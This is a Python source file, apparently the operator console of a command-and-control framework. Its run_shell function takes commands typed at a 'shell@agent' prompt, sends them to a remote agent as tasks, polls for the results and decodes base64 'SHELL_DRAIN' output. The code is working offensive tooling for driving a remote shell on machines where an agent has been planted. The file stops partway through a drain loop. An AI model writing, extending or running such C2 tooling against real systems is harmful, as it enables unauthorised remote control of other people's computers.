import base64
import time
import re


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def run_shell(manager, agent_id, c2_server):
    print(f"[*] Entering interactive shell with agent {agent_id}")
    print("[*] Type 'exit' to return to menu")
    print()

    while True:
        try:
            cmd = input(f"shell@{agent_id}> ")
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if cmd.lower() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        task_id = manager.send_task(
            agent_id, "shell_interactive", {"command": cmd.strip()}
        )
        if not task_id:
            print("[!] Agent not found")
            break

        for _ in range(30):
            time.sleep(0.3)
            results = manager.get_results(agent_id)
            for r in results:
                if r["task_id"] == task_id:
                    out = r["output"]
                    if out:
                        print(out, end="" if out.endswith("\n") else "\n")
                    break
            else:
                continue
            break
        else:
            print("[!] Timeout")

        # Drain SHELL_DRAIN results while idle
        for _ in range(4):
            time.sleep(0.3)
            results = manager.get_results(agent_id)
            for r in results:
                out = r.get("output", "")
                if out.startswith("SHELL_DRAIN:"):
                    try:
                        data = strip_ansi(
                            base64.b64decode(out[12:]).decode(errors="replace")
                        )
                        if data.strip():
                            print(data, end="")
                    except Exception:
                        pass
                    r["output"] = ""
